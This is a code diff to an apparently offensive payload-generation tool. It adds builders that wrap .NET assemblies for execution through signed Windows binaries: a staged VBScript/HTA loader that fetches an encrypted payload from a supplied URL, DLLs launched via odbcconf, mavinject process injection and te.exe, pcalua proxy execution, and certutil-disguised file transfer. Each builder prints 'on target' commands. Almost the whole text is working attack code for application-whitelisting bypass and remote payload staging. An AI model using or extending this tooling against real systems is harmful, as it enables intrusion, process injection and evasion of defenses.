@@ -613,7 +613,55 @@ def _build_vbs_family(args, assembly_args, template_file, output_file):
     return output_path
 
 
+def _build_vbs_staged(args, assembly_args, output_file):
+    assembly_bytes = _read_input(args.assembly, "Assembly")
+    template_path = get_template_path("vbscript_staged.vbs", args.template)
+    template = load_template(template_path)
+
+    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
+    key_b64 = _b64(key)
+
+    output_path = args.output or os.path.join(OUTPUT_DIR, output_file)
+    _ensure_output_dir(output_path)
+
+    payload_path = os.path.splitext(output_path)[0] + ".bin"
+    with open(payload_path, "wb") as f:
+        f.write(encrypted)
+    print(f"[*] Staged: payload written to {payload_path}", file=sys.stderr)
+    print(f"[*] Host at: {args.staged}", file=sys.stderr)
+
+    if args.encryption == "xor":
+        template = patch_vbs_for_xor(template)
+        template = inject_placeholders(template, {'"YOURKEYHERE"': f'"{key_b64}"'})
+    else:
+        template = remove_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")
+        iv_b64 = _b64(iv)
+        template = inject_placeholders(template, {
+            '"YOURKEYHERE"': f'"{key_b64}"',
+            '"YOURIVHERE"': f'"{iv_b64}"',
+        })
+
+    template = inject_placeholders(template, {'"YOURSTAGEDURL"': f'"{args.staged}"'})
+
+    if assembly_args:
+        args_str = _vbs_args(assembly_args)
+        template = template.replace("YOURARGS", args_str)
+    else:
+        template = template.replace("Array(YOURARGS)", "Array()")
+
+    with open(output_path, "w") as f:
+        f.write(template)
+
+    print(f"[+] Written: {output_path}", file=sys.stderr)
+    return output_path
+
+
 def build_vbscript(args, assembly_args):
+    if getattr(args, "staged", None):
+        output_path = _build_vbs_staged(args, assembly_args, "payload_staged.vbs")
+        print(f"[*] On target:", file=sys.stderr)
+        print(f"    cscript {os.path.basename(output_path)}", file=sys.stderr)
+        return
     output_path = _build_vbs_family(
         args, assembly_args,
         template_file="vbscript_payload.vbs",
@@ -624,6 +672,11 @@ def build_vbscript(args, assembly_args):
 
 
 def build_hta(args, assembly_args):
+    if getattr(args, "staged", None):
+        output_path = _build_vbs_staged(args, assembly_args, "payload_staged.hta")
+        print(f"[*] On target:", file=sys.stderr)
+        print(f"    mshta {os.path.basename(output_path)}", file=sys.stderr)
+        return
     output_path = _build_vbs_family(
         args, assembly_args,
         template_file="hta_payload.hta",
@@ -1038,6 +1091,98 @@ def build_msiexec(args, assembly_args):
               f"-static-libstdc++ -s", file=sys.stderr)
 
 
+def build_odbcconf(args, assembly_args):
+    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "dll")
+    dll_name = os.path.basename(output_path).replace(".cpp", ".dll")
+    print(f"[*] On target:", file=sys.stderr)
+    print(f"    odbcconf /a {{REGSVR {dll_name}}}", file=sys.stderr)
+    print(f"    odbcconf /f response.rsp  (with REGSVR {dll_name} in file)", file=sys.stderr)
+    if not getattr(args, "compile", False):
+        print(f"[*] Compile with:", file=sys.stderr)
+        print(f"    x86_64-w64-mingw32-g++ -shared -o {dll_name} "
+              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
+              f"-static-libstdc++ -s", file=sys.stderr)
+
+
+def build_mavinject(args, assembly_args):
+    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "dll")
+
+    # Uncomment DllMain execute block so payload fires on injection
+    with open(output_path, "r") as f:
+        content = f.read()
+    content = uncomment_csharp_block(content, "// DLLMAIN_EXECUTE_START", "// DLLMAIN_EXECUTE_END")
+    with open(output_path, "w") as f:
+        f.write(content)
+
+    dll_name = os.path.basename(output_path).replace(".cpp", ".dll")
+    print(f"[*] On target:", file=sys.stderr)
+    print(f"    mavinject <PID> /INJECTRUNNING {dll_name}", file=sys.stderr)
+    print(f"[*] Find a target PID:", file=sys.stderr)
+    print(f"    tasklist /fi \"username eq %USERNAME%\"", file=sys.stderr)
+    if not getattr(args, "compile", False):
+        print(f"[*] Compile with:", file=sys.stderr)
+        print(f"    x86_64-w64-mingw32-g++ -shared -o {dll_name} "
+              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
+              f"-static-libstdc++ -s", file=sys.stderr)
+
+
+def build_te(args, assembly_args):
+    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "dll")
+
+    with open(output_path, "r") as f:
+        content = f.read()
+    content = uncomment_csharp_block(content, "// DLLMAIN_EXECUTE_START", "// DLLMAIN_EXECUTE_END")
+    with open(output_path, "w") as f:
+        f.write(content)
+
+    dll_name = os.path.basename(output_path).replace(".cpp", ".dll")
+    print(f"[*] On target (requires WDK/ADK te.exe):", file=sys.stderr)
+    print(f"    te.exe {dll_name}", file=sys.stderr)
+    print(f"[*] Common te.exe paths:", file=sys.stderr)
+    print(f"    C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\Runtimes\\TAEF\\x64\\te.exe", file=sys.stderr)
+    if not getattr(args, "compile", False):
+        print(f"[*] Compile with:", file=sys.stderr)
+        print(f"    x86_64-w64-mingw32-g++ -shared -o {dll_name} "
+              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
+              f"-static-libstdc++ -s", file=sys.stderr)
+
+
+def build_pcalua(args, assembly_args):
+    output_path = _build_vbs_family(
+        args, assembly_args,
+        template_file="vbscript_payload.vbs",
+        output_file="payload_ready.vbs",
+    )
+    vbs_name = os.path.basename(output_path)
+    print(f"[*] On target:", file=sys.stderr)
+    print(f"    pcalua -a C:\\Windows\\System32\\cscript.exe -c {vbs_name}", file=sys.stderr)
+    print(f"[*] Alternate (via mshta — rebuild with 'hta' type):", file=sys.stderr)
+    print(f"    pcalua -a C:\\Windows\\System32\\mshta.exe -c payload.hta", file=sys.stderr)
+
+
+def build_certutil(args, assembly_args):
+    input_data = _read_input(args.assembly, "Input file")
+    b64_data = base64.b64encode(input_data).decode()
+    lines = [b64_data[i:i+64] for i in range(0, len(b64_data), 64)]
+    encoded = "-----BEGIN CERTIFICATE-----\n"
+    encoded += "\n".join(lines) + "\n"
+    encoded += "-----END CERTIFICATE-----\n"
+
+    output_path = args.output or os.path.join(OUTPUT_DIR, "encoded.b64")
+    _ensure_output_dir(output_path)
+    with open(output_path, "w") as f:
+        f.write(encoded)
+
+    size_kb = os.path.getsize(output_path) / 1024
+    orig_name = os.path.basename(args.assembly)
+    out_name = os.path.basename(output_path)
+    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
+    print(f"[*] On target:", file=sys.stderr)
+    print(f"    certutil -decode {out_name} {orig_name}", file=sys.stderr)
+    print(f"[*] Alternative (echo + decode):", file=sys.stderr)
+    print(f"    certutil -decode C:\\Windows\\Temp\\{out_name} C:\\Windows\\Temp\\{orig_name}", file=sys.stderr)
+
+
 PAYLOAD_BUILDERS = {
     "msbuild": build_msbuild,
     "installutil": build_installutil,
@@ -1059,6 +1204,11 @@ PAYLOAD_BUILDERS = {
     "csi": build_csi,
     "control": build_control,
     "msiexec": build_msiexec,
+    "odbcconf": build_odbcconf,
+    "mavinject": build_mavinject,
+    "certutil": build_certutil,
+    "pcalua": build_pcalua,
+    "te": build_te,
 }
 
 PAYLOAD_DESCRIPTIONS = {
@@ -1082,4 +1232,9 @@ PAYLOAD_DESCRIPTIONS = {
     "csi": "C# Interactive (.csx) — csi.exe script, no compilation needed",
     "control": "Control panel applet (.cpl) — control.exe loads native DLL",
     "msiexec": "MSI DLL registration (.dll) — msiexec /y DllRegisterServer",
+    "odbcconf": "ODBC config DLL load (.dll) — odbcconf /a {REGSVR} DllRegisterServer",
+    "mavinject": "DLL injection (.dll) — mavinject PID /INJECTRUNNING, fires via DllMain",
+    "certutil": "Certutil encode (.b64) — encode any file for certutil -decode transfer",
+    "pcalua": "PcaLua proxy (.vbs) — VBScript via Program Compatibility Assistant, alternate parent process",
+    "te": "TAEF test loader (.dll) — te.exe loads DLL, fires via DllMain (requires WDK/ADK)",
 }
